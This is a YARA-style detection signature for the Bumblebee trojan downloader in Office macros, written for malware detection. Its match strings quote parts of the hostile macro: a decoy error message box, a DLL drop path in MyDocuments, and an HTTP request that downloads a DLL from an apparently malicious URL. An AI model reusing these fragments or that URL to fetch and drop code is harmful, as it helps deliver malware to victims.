
rule TrojanDownloader_O97M_Bumblebee_PDA_MTB{
	meta:
		description = "TrojanDownloader:O97M/Bumblebee.PDA!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 "
		
	strings :
		$a_01_0 = {2e 53 70 65 63 69 61 6c 46 6f 6c 64 65 72 73 28 22 4d 79 44 6f 63 75 6d 65 6e 74 73 22 29 20 26 20 22 5c 6e 61 6d 65 2e 64 6c 6c 22 } //1 .SpecialFolders("MyDocuments") & "\name.dll"
		$a_01_1 = {4d 73 67 42 6f 78 20 22 53 6f 6d 65 74 68 69 6e 67 20 77 65 6e 74 20 77 72 6f 6e 67 21 22 2c 20 76 62 45 78 63 6c 61 6d 61 74 69 6f 6e } //1 MsgBox "Something went wrong!", vbExclamation
		$a_01_2 = {2e 4f 70 65 6e 20 22 47 45 54 22 2c 20 22 68 74 74 70 73 3a 2f 2f 69 72 73 2e 72 65 76 69 65 77 73 2f 4b 46 4f 4a 52 49 4f 48 4e 56 28 52 29 28 41 23 49 46 4b 29 5f 46 49 4f 23 29 5f 46 4b 5f 44 2f 30 34 31 31 72 5f 63 72 34 2e 64 6c 6c 22 2c 20 62 47 65 74 41 73 41 73 79 6e 63 2c 20 22 75 73 65 72 69 64 22 2c 20 22 70 61 73 73 22 } //1 .Open "GET", "https://irs.reviews/KFOJRIOHNV(R)(A#IFK)_FIO#)_FK_D/0411r_cr4.dll", bGetAsAsync, "userid", "pass"
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1) >=3
 
}